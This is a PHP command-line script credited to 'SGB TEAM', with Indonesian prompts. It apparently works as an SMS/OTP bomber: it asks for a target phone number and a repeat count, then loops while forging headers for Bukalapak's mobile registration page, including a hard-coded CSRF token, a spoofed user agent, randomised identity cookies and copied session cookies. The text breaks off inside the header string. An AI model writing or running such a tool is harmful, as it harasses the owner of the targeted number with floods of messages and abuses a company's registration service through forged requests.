<?php

echo "COPYRIGHT : SGB TEAM\n\n";

echo "Nomor Target?\nInput : ";

$nomer = trim(fgets(STDIN));

if(strlen($nomer)==11){

$nomer = str_replace("0","62".$nomer);

}elseif(strlen($nomer)>12){

$nomer = str_replace("62","0",$nomer);

}

echo "Target: $nomer (y/n)";

$cek = trim(fgets(STDIN));

if($cek=="n") exit("Stopped!\n");

echo "Jumlah?\nInput : ";

$jumlah = trim(fgets(STDIN));

for($a=0;$a<$jumlah;$a++) {

$rand1 = md5(rand(12345678,98765432));

$rand2 = md5(rand(12345678,98765432));

$rand = array($rand1,$rand2);

$rand3 = md5($rand[rand(1,2)]);

$config['headers'] = explode("\n", "Host: m.bukalapak.com

Connection: keep-alive

Content-Length: 134

Origin: https://m.bukalapak.com

X-CSRF-Token:

uYUfi93g92mZboBVB4UMwYInorBNOgyYEAbPUTikHht+xseF8BFUgg9qSgQWA9MRy7eL8

G/SnbYUGg0JRM1fjw==

User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H)

AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Accept: */*

X-Requested-With: XMLHttpRequest

Save-Data: on

Referer: https://m.bukalapak.com/register?from=home_mobile

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9,id;q=0.8

Cookie: identity=".$rand1."; browser_id=".$rand2."; _ga=GA1.2.1024758930.1531960985;

_vwo_uuid_v2=DE8E70E7E9A8960F05F20FE0ACE87643B|378e4a2f30c36053c1cb833e8

9ecbc2e; _gid=GA1.2.622427606.1533988422; scs=%7B%22t%22%3A1%7D;

spUID=15339884253603c43b2de12.c5b45553;

session_id=e95e7511997432af179935abfce90320;

__auc=3eed305416528d5f584187b45b2; G_ENABLED_IDPS=google; track_register=true;

affiliate_landing_visit=true;

mp_51467a440ff602e0c13d513c36387ea8_mixpanel=%7B%22distinct_id%22%3A%20%22

164affd88ae1d-0791dbbd558a18-1f20130c-38400-164affd88aff4%22%2C%22utm_source%

22%3A%20%22hasoffers-1851%22%2C%22utm_medium%22%3A%20%22affiliate%22%2

C%22utm_campaign%22%3A%20%2215%22%2C%22%24initial_referrer%22%3A%20%22

%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%7D;

ins-gaSSId=cdd66ffd-18ce-a176-a3c3-26f0ac9ec000_1534027025;
